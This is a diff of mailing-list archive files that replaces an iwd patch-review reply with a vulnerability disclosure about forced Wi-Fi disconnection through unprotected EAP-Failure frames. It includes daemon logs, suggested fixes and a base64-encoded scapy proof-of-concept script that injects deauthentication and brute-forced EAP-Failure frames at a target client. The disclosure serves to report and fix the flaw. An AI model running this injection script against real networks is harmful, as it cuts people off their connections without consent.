@@ -1,88 +1,131 @@
-Content-Type: multipart/mixed; boundary="===============5486033970056403476=="
+Content-Type: multipart/mixed; boundary="===============2746621939881908982=="
 MIME-Version: 1.0
-From: Denis Kenzior <denkenz at gmail.com>
+From: Domien Schepers <schepers.d at northeastern.edu>
 To: iwd at lists.01.org
-Subject: Re: [PATCH 03/12] netconfig: Track gateway address strings
-Date: Fri, 22 Oct 2021 12:16:56 -0500
-Message-ID: <2b2af412-93b9-d620-8e4e-7bdd7a1c35ad@gmail.com>
-In-Reply-To: 20211021085041.294524-3-andrew.zaborowski@intel.com
+Subject: denial-of-service vulnerability in processing of EAP failures
+Date: Fri, 06 May 2022 14:00:31 +0000
+Message-ID: <3C791664-2207-4B22-A68E-C6A02148D271@northeastern.edu>
 
---===============5486033970056403476==
+--===============2746621939881908982==
 Content-Type: text/plain; charset="utf-8"
 MIME-Version: 1.0
 Content-Transfer-Encoding: quoted-printable
 
-Hi Andrew,
+We discovered a denial-of-service vulnerability that allows an adversary to=
+ forcibly disconnect the IWD client from a protected Wi-Fi network even whe=
+n Wi-Fi Management Frame Protection (MFP) is being used. The problem is tha=
+t the reception of an unprotected EAP-Failure message will cause the client=
+ to disconnect even when MFP is used, resulting in denial-of-service.
 
-On 10/21/21 3:50 AM, Andrew Zaborowski wrote:
-> Cache the latest v4 and v6 gateway IP string in struct netconfig state
-> to be able to more easily detect changes in those values in future
-> commits and perhaps to simplify the ..._routes_install functions.
-> netconfig_ipv4_get_gateway's out_mac parameter can now be NULL.  While
-> editing that function fix a small formatting annoyance.
-> ---
->   src/netconfig.c | 62 +++++++++++++++++++++++++++++++++++++++----------
->   1 file changed, 50 insertions(+), 12 deletions(-)
-> =
+Interestingly, the attack is successful against both personal and enterpris=
+e networks. In case of enterprise networks, the EAP-Failure ID has to match=
+ the session's randomized ID. However, since there are only 256 possible va=
+lues, it can be quickly brute-forced. In case of personal networks, the EAP=
+-Failure ID can be set to zero.
+
+Snippet from the logs:
+
+	src/netdev.c:netdev_unicast_notify() Unicast notification Control Port Fra=
+me(129)
+	src/netdev.c:netdev_control_port_frame_event() =
+
+	EAP completed with eapFail
+	4-Way handshake failed for ifindex: 19, reason: 23
+	src/netdev.c:netdev_mlme_notify() MLME notification Del Station(20)
+	src/netdev.c:netdev_link_notify() event 16 on ifindex 19
+	src/netdev.c:netdev_mlme_notify() MLME notification Deauthenticate(39)
+	src/netdev.c:netdev_deauthenticate_event() =
+
+	src/netdev.c:netdev_mlme_notify() MLME notification Disconnect(48)
+	src/netdev.c:netdev_disconnect_event() =
 
 
-<snip>
+We confirmed the attack against versions 1.24, 1.25, 1.26, 1.27. See the at=
+tachment for our proof-of-concept code to reproduce the issue.
 
-> @@ -436,6 +438,8 @@ static char *netconfig_ipv4_get_gateway(struct netcon=
-fig *netconfig,
->   {
->   	const struct l_dhcp_lease *lease;
->   	char *gateway;
-> +	const struct ie_fils_ip_addr_response_info *fils =3D
-> +		netconfig->fils_override;
->   =
+A potential solution is to discard EAP-Failure messages when the client is =
+not using IEEE 802.1X authentication. Furthermore, one could choose to disc=
+ard EAP-Failure messages after establishing a successful connection.
 
->   	switch (netconfig->rtm_protocol) {
->   	case RTPROT_STATIC:
-> @@ -449,15 +453,12 @@ static char *netconfig_ipv4_get_gateway(struct netc=
-onfig *netconfig,
->   		return gateway;
->   =
+This issue was discovered by Domien Schepers (Northeastern University) and =
+Mathy Vanhoef (imec-DistriNet, KU Leuven).
 
->   	case RTPROT_DHCP:
-> -		if (netconfig->fils_override &&
-> -				netconfig->fils_override->ipv4_gateway) {
-> -			gateway =3D netconfig_ipv4_to_string(
-> -					netconfig->fils_override->ipv4_gateway);
-> +		if (fils && fils->ipv4_gateway) {
-> +			gateway =3D netconfig_ipv4_to_string(fils->ipv4_gateway);
->   =
 
-> -			if (gateway && !l_memeqzero(netconfig->fils_override->
-> -							ipv4_gateway_mac, 6))
-> -				*out_mac =3D netconfig->fils_override->
-> -					ipv4_gateway_mac;
-> +			if (gateway && out_mac &&
-> +					!l_memeqzero(fils->ipv4_gateway_mac, 6))
-> +				*out_mac =3D fils->ipv4_gateway_mac;
->   =
+--===============2746621939881908982==
+Content-Type: text/x-python-script
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="iwd-disconnect-eapfailure.py"
 
->   			return gateway;
->   		}
-> @@ -495,7 +496,7 @@ static struct l_rtnl_address *netconfig_get_static6_a=
-ddress(
->   	prefix_len =3D strtoul(p, NULL, 10);
->   	if (!unlikely(errno =3D=3D EINVAL || errno =3D=3D ERANGE ||
->   			!prefix_len || prefix_len > 128)) {
-> -		l_error("netconfig: Invalid prefix '%s'  provided in network"
-> +		l_error("netconfig: Invalid prefix '%s' provided in network"
->   				" configuration file", p);
->   		return NULL;
->   	}
+IyBDb3B5cmlnaHQgKEMpIDIwMjIsIERvbWllbiBTY2hlcGVycy4NCiMgQlNEIDItQ2xhdXNlIExp
+Y2Vuc2UuDQpmcm9tIHNjYXB5LmFsbCBpbXBvcnQgKg0KaW1wb3J0IGFyZ3BhcnNlDQoNCiMjIyMj
+IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyBJbnN0
+cnVjdGlvbnMgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyMjIyMjIyMj
+IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KIyBFeGFtcGxlIENv
+bW1hbmRzOg0KIyA+IHB5dGhvbiBpd2QtZGlzY29ubmVjdC1lYXBmYWlsdXJlLnB5IC0taWZhY2Ug
+d2xhbjAgLS1ic3NpZCBhYTphYTphYTphYTphYTphYSAtLWNsaWVudCBiYjpiYjpiYjpiYjpiYjpi
+YiAtLWRlYXV0aA0KIyA+IHB5dGhvbiBpd2QtZGlzY29ubmVjdC1lYXBmYWlsdXJlLnB5IC0taWZh
+Y2Ugd2xhbjAgLS1ic3NpZCBhYTphYTphYTphYTphYTphYSAtLWNsaWVudCBiYjpiYjpiYjpiYjpi
+YjpiYiAtLWVhcGZhaWx1cmUNCg0KIyBXaGVyZSAtLWlmYWNlIGlzIHlvdXIgYWR2ZXJzYXJpYWwg
+aWZhY2UgaW4gbW9uaXRvciBtb2RlLCAtLWJzc2lkIGlzIHRoZSBuZXR3b3JrJ3MgQlNTSUQsDQoj
+IGFuZCAtLWNsaWVudCB0aGUgdmljdGltJ3MgTUFDIGFkZHJlc3MuDQoNCiMgVGhlIC0tZGVhdXRo
+IG9wdGlvbiBjYW4gYmUgdXNlZCB0byB2ZXJpZnkgdGhlIG5ldHdvcmsgaXMgZW5mb3JjaW5nIFdp
+LUZpIE1GUC4gSWYgeWVzLA0KIyB0aGUgdW5wcm90ZWN0ZWQgZGVhdXRoZW50aWNhdGlvbiBmcmFt
+ZSB3aWxsIGJlIGRpc2NhcmRlZC4NCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
+IyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjIE5vdGVzICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
+IyMjIyMjIyMjIyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
+IyMjIyMjIyMjIyMjIw0KDQojIFlvdXIgaW50ZXJmYWNlIG11c3QgYmUgc2V0IHRvIG1vbml0b3Ig
+bW9kZSBvbiB0aGUgYXBwcm9yaWF0ZSBjaGFubmVsLiBGb3IgZXhhbXBsZToNCiMgPiBpZmNvbmZp
+ZyB3bGFuMCBkb3duDQojID4gaXcgd2xhbjAgc2V0IG1vbml0b3IgY29udHJvbA0KIyA+IGlmY29u
+ZmlnIHdsYW4wIHVwDQojID4gaXcgZGV2IHdsYW4wIHNldCBjaGFubmVsIDENCiMgPiBpdyB3bGFu
+MCBpbmZvDQoNCiMgRXhhbXBsZSBJV0QgY29tbWFuZCB3aXRoIGRlYnVnIG91dHB1dDoNCiMgPiBz
+dWRvIHNyYy9pd2QgLWkgd2xhbjAgLWQNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
+IyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjIFRyb3VibGVzaG9vdGluZyAjIyMjIyMjIyMjIyMj
+IyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
+IyMjIyMjIyMjIyMjIyMjIw0KDQojIC0gVmVyaWZ5IHlvdXIgaW50ZXJmYWNlIGlzIHNldCB0byBt
+b25pdG9yIG1vZGUgb24gdGhlIGFwcHJvcHJpYXRlIGNoYW5uZWwuDQojIC0gVmVyaWZ5IHlvdXIg
+bG9ncyB0byBzZWUgaWYgdGhlIHZpY3RpbSBjbGllbnQgcmVjZWl2ZXMgb3VyIGFkdmVyc2FyaWFs
+IGZyYW1lcy4NCiMgLSBPcGVuIFdpcmVzaGFyayB0byBpbnZlc3RpZ2F0ZS4gRmlsdGVyIGZvciBk
+ZWF1dGhlbnRpY2F0aW9uIGZyYW1lczoNCiMgICB3bGFuLmZjLnR5cGVfc3VidHlwZT09MHgwMDBj
+DQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMN
+CiMjIyBDb2RlICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMj
+IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KZGVm
+IGluamVjdF9kZWF1dGgoIGlmYWNlICwgYnNzaWQgLCBjbGllbnQgKToNCgkiIiJJbmplY3QgYW4g
+dW5wcm90ZWN0ZWQgZGVhdXRoZW50aWNhdGlvbiB0byB2ZXJpZnkgV2ktRmkgTUZQIGlzIGVuZm9y
+Y2VkLiIiIg0KCXByaW50KCJbK10gSW5qZWN0aW5nIGFuIHVucHJvdGVjdGVkIGRlYXV0aGVudGlj
+YXRpb24uIikNCgkNCglmcmFtZSA9IERvdDExKCkvRG90MTFEZWF1dGgocmVhc29uPTIpICMgQXV0
+aGVudGljYXRpb24gRXhwaXJlZC4NCglmcmFtZVtEb3QxMV0uYWRkcjEgPSBjbGllbnQNCglmcmFt
+ZVtEb3QxMV0uYWRkcjIgPSBic3NpZA0KCWZyYW1lW0RvdDExXS5hZGRyMyA9IGJzc2lkDQoJDQoJ
+IyBUcmFuc21pdC4NCglwcmludCgiWytdICIgKyBmcmFtZS5zdW1tYXJ5KCkpDQoJc2VuZHAoUmFk
+aW9UYXAoKS9mcmFtZSwgaWZhY2U9aWZhY2UsIHZlcmJvc2U9RmFsc2UpDQoNCmRlZiBpbmplY3Rf
+ZWFwX2ZhaWx1cmUoIGlmYWNlICwgYnNzaWQgLCBjbGllbnQgKToNCgkiIiJJbmplY3QgRUFQLUZh
+aWx1cmVzLiIiIg0KCXByaW50KCJbK10gSW5qZWN0aW5nIEVBUC1GYWlsdXJlcy4iKQ0KCQ0KCWZy
+YW1lID0gRG90MTEodHlwZT0iRGF0YSIsIHN1YnR5cGU9MCkNCglmcmFtZVtEb3QxMV0uYWRkcjEg
+PSBjbGllbnQNCglmcmFtZVtEb3QxMV0uYWRkcjIgPSBic3NpZA0KCWZyYW1lW0RvdDExXS5hZGRy
+MyA9IGJzc2lkDQoJDQoJIyBDb25zdHJ1Y3QgYW4gRUFQLUZhaWx1cmUuDQoJZnJhbWUgLz0gTExD
+KCkvU05BUCgpL0VBUE9MKCB2ZXJzaW9uPSI4MDIuMVgtMjAwMSIgKQ0KCWZyYW1lIC89IEVBUCgg
+Y29kZT0iRmFpbHVyZSIgKQ0KDQoJIyBUcmFuc21pdC4NCglwcmludCgiWytdICIgKyBmcmFtZS5z
+dW1tYXJ5KCkpDQoJZm9yIGkgaW4gcmFuZ2UoMjU1KToNCgkJIyBOT1RFOiBBZ2FpbnN0IHBlcnNv
+bmFsIG5ldHdvcmtzIG9ubHkgYSBzaW5nbGUgZnJhbWUgd2l0aCBFQVAtSUQ9MCBpcyBzdWZmaWNp
+ZW50Lg0KCQlmcmFtZVtFQVBdLmlkID0gaQ0KCQlzZW5kcChSYWRpb1RhcCgpL2ZyYW1lLCBpZmFj
+ZT1pZmFjZSwgdmVyYm9zZT1GYWxzZSkNCgkNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQoN
+CgkjIEFyZ3VtZW50IFBhcnNlci4NCglwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcigp
+DQoJcGFyc2VyLmFkZF9hcmd1bWVudCggJy0taWZhY2UnICwgZGVzdD0naWZhY2UnICwgcmVxdWly
+ZWQ9VHJ1ZSAsIFwNCgkJaGVscD0nSW50ZXJmYWNlIGluIG1vbml0b3IgbW9kZS4nICkNCglwYXJz
+ZXIuYWRkX2FyZ3VtZW50KCAnLS1ic3NpZCcgLCBkZXN0PSdic3NpZCcgLCByZXF1aXJlZD1UcnVl
+ICwgXA0KCQloZWxwPSdOZXR3b3JrIEJTU0lEIGluIHh4Onh4Onh4Onh4Onh4Onh4IGZvcm1hdC4n
+ICkNCglwYXJzZXIuYWRkX2FyZ3VtZW50KCAnLS1jbGllbnQnICwgZGVzdD0nY2xpZW50JyAsIHJl
+cXVpcmVkPVRydWUgLCBcDQoJCWhlbHA9J0NsaWVudCBNQUMgaW4geHg6eHg6eHg6eHg6eHg6eHgg
+Zm9ybWF0LicgKQ0KCXBhcnNlci5hZGRfYXJndW1lbnQoICctLWRlYXV0aCcgLCBhY3Rpb249J3N0
+b3JlX3RydWUnICwgcmVxdWlyZWQ9RmFsc2UgLCBcDQoJCWhlbHA9J1ZlcmlmeSBXaS1GaSBNRlAg
+aXMgZW5mb3JjZWQgd2l0aCBhbiB1bnByb3RlY3RlZCBkZWF1dGhlbnRpY2F0aW9uLicgKQ0KCXBh
+cnNlci5hZGRfYXJndW1lbnQoICctLWVhcGZhaWx1cmUnICwgYWN0aW9uPSdzdG9yZV90cnVlJyAs
+IHJlcXVpcmVkPUZhbHNlICwgXA0KCQloZWxwPSdSdW4gdGhlIEVBUC1GYWlsdXJlIGF0dGFjay4n
+ICkNCglhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KDQoJIyBSdW4uDQoJaWYgYXJncy5kZWF1
+dGg6DQoJCWluamVjdF9kZWF1dGgoIGFyZ3MuaWZhY2UgLCBhcmdzLmJzc2lkICwgYXJncy5jbGll
+bnQpDQoJZWxpZiBhcmdzLmVhcGZhaWx1cmU6DQoJCWluamVjdF9lYXBfZmFpbHVyZSggYXJncy5p
+ZmFjZSAsIGFyZ3MuYnNzaWQgLCBhcmdzLmNsaWVudCApDQoJZWxzZToNCgkJcHJpbnQoIlstXSBQ
+bGVhc2Ugc3BlY2lmeSBhbiBvcHRpb24uIikNCg==
 
-I separated out these 3 chunks into 2 separate commits since they did not s=
-eem =
-
-to be related to the commit description.
-
-So this commit became 3.  Please review.  Applied, thanks.
-
-Regards,
--Denis
---===============5486033970056403476==--
+--===============2746621939881908982==--
 
